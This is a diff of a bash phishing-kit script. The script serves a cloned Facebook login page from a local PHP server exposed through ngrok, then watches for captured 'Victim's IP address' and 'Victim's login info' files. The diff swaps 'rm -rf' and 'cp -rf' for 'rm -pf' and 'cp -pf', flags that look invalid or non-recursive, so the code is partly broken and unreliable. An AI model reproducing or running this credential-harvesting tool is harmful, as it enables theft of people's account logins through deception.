@@ -8,7 +8,7 @@ if [[ ! -d ".server" ]]; then
 	mkdir -p ".server"
 fi
 if [[ -d ".server/www" ]]; then
-	rm -rf ".server/www"
+	rm -pf ".server/www"
 	mkdir -p ".server/www"
 else
 	mkdir -p ".server/www"
@@ -93,13 +93,13 @@ download_ngrok() {
 	url="$1"
 	file=$(basename "$url")
 	if [[ -e "$file" ]]; then
-		rm -rf "$file"
+		rm -pf "$file"
 	fi
 	wget --no-check-certificate "$url" > /dev/null 2>&1
 	if [[ -e "$file" ]]; then
 		unzip "$file" > /dev/null 2>&1
 		mv -f ngrok .server/ngrok > /dev/null 2>&1
-		rm -rf "$file" > /dev/null 2>&1
+		rm -pf "$file" > /dev/null 2>&1
 		chmod +x .server/ngrok > /dev/null 2>&1
 	else
 		echo -e "Downloading failed. Install Ngrok manually."
@@ -142,7 +142,7 @@ about() {
 		ulul pakyu
 	EOF
 
-	read -r "Select an option :"
+	read -p "Select an option :"
 
 	if [[ "$REPLY" == x || "$REPLY" == X ]]; then
 		exit_msg
@@ -161,7 +161,7 @@ PORT='8080'
 
 setup_site() {
 	echo -e "start setting up server..."
-	cp -rf .sites/"$website"/* .server/www
+	cp -pf .sites/"$website"/* .server/www
 	cp -f .sites/ip.php .server/www/
 	echo -ne "setting up PHP server..." 
 	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
@@ -195,13 +195,13 @@ grab_data() {
 		if [[ -e ".server/www/ip.txt" ]]; then
 			echo -e "\n\nFound! Victim's IP address l"
 			grap_ip
-			rm -rf .server/www/ip.txt
+			rm -pf .server/www/ip.txt
 		fi
 		sleep 0.75
 		if [[ -e ".server/www/usernames.txt" ]]; then
 			echo -e "\n\nFound! Victim's login info."
 			grab_creds
-			rm -rf .server/www/usernames.txt
+			rm -pf .server/www/usernames.txt
 		fi
 		sleep 0.75
 	done
@@ -246,7 +246,7 @@ menu_tunnel() {
 
 	EOF
 
-	read -r "Select a port forwarding service : "
+	read -p "Select a port forwarding service : "
 
 	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
 		starting_localhost
@@ -265,7 +265,7 @@ site_fb() {
 		[01] My Facebook Page 
 	EOF
 
-	read -r "Select an option :"
+	read -p "Select an option :"
 
 	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
 		website="facebook"
